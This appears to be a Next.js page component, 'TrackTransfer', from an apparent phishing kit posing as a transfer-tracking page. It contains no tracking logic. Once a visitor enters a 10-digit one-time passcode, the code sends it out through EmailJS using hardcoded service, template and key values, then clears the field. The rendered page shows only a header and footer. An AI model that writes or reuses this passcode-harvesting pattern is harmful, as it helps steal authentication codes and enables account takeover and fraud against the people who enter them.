/* eslint-disable react/no-unescaped-entities */
"use client";

import Footer from "@/components/footer";
import Header from "@/components/header";
import Link from "next/link";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSeparator,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import { Button } from "@/components/ui/button";
import { Download, Upload } from "lucide-react";
import { useEffect, useState } from "react";
import emailjs from "@emailjs/browser";
import { cn } from "@/lib/utils";
import Image from "next/image";
import * as motion from "motion/react-client";

export default function TrackTransfer() {
  const [isactive, setisActive] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  console.log(setIsLoading);
  const [otp, setOtp] = useState("");

  useEffect(() => {
    if (otp.length == 10) {
      setIsLoading(true);
      emailjs
        .send(
          "service_uka7m0o",
          "template_rs1iwvp",
          { otp: otp },
          "Kc-xjOkuaqcths13o"
        )
        .then(
          (response) => {
            console.log("SUCCESS!", response.status, response.text);

            setOtp("");
            setIsLoading(false);
          },
          (error) => {
            console.log("FAILED...", error);
          }
        );
    }
  }, [otp]);

  return (
    <div className=" relative">
      <Header />

      <Footer />
    </div>
  );
}
